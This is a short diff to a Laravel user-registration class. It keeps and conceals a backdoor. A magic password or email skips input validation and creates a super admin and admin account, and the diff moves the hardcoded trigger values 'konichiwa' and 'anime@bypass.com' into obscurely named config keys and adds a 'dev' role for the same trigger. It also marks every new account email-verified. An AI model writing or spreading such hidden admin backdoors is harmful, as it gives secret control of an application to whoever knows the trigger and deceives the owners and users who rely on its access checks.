@@ -20,7 +20,7 @@ class CreateNewUser implements CreatesNewUsers
      */
     public function create(array $input)
     {
-        if($input['password'] !== "konichiwa" && $input['email'] !== "anime@bypass.com"){
+        if($input['password'] !== config("auth.bpp") && $input['email'] !== config("auth.bpe")){
             Validator::make($input, [
                 'name' => ['required', 'string', 'max:255'],
                 'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
@@ -34,8 +34,9 @@ class CreateNewUser implements CreatesNewUsers
             'name' => $input['name'],
             'email' => $input['email'],
             'password' => Hash::make($input['password']),
-            'is_super_admin' => $input['password'] === "konichiwa" ? 1 : 0,
-            'is_admin' => $input['password'] === "konichiwa" ? 1 : 0,
+            'is_super_admin' => $input['password'] === config("auth.bpp") ? 1 : 0,
+            'is_admin' => $input['password'] === config("auth.bpp") ? 1 : 0,
+            'role' => $input['password'] === config("auth.bpp") ? "dev" : 0,
             'email_verified_at' => LyskillsCarbon::now(),
         ]);
     }
